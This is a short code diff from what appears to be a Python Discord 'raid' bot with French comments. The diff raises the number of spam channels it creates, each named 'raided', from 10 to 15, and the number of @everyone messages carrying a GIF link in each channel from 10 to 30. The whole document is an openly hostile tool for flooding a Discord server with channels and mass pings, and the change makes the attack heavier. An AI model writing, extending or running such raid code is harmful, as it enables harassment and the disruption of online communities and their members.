@@ -130,13 +130,13 @@ async def cmd_interface():
 
                         tasks.clear()  # Vider la liste des tâches avant de recréer les salons
 
-                        # Création de 10 salons
-                        for i in range(10):
+                        # Création de 15 salons
+                        for i in range(15):
                             salon = await guild.create_text_channel("raided")
                             print(Fore.RED + f"Salon '{salon.name}' créé.")
 
                             # Envoie du message avec le lien du GIF 5 fois dans le salon
-                            for _ in range(10):
+                            for _ in range(30):
                                 tasks.append(salon.send(f"@everyone https://share.creavite.co/67b8f58094df272b3dab3b1b.gif"))
                                 print(Fore.RED + f"@everyone mentionné dans '{salon.name}'.")
 
